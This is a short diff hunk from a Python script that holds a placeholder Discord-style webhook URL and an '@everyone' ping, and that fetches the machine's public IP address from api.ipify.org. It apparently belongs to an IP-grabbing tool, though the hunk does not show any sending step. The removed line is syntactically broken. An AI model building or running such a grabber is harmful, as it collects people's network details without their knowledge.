@@ -2,7 +2,7 @@ import requests, json
 from urllib.request import *
 
 webhook_url = 'WEBHOOK URL HERE'
-ping = '@everyone' if True if False ''
+ping = True
 
 response = requests.get('https://api.ipify.org/?format=json')
 dt = response.json()
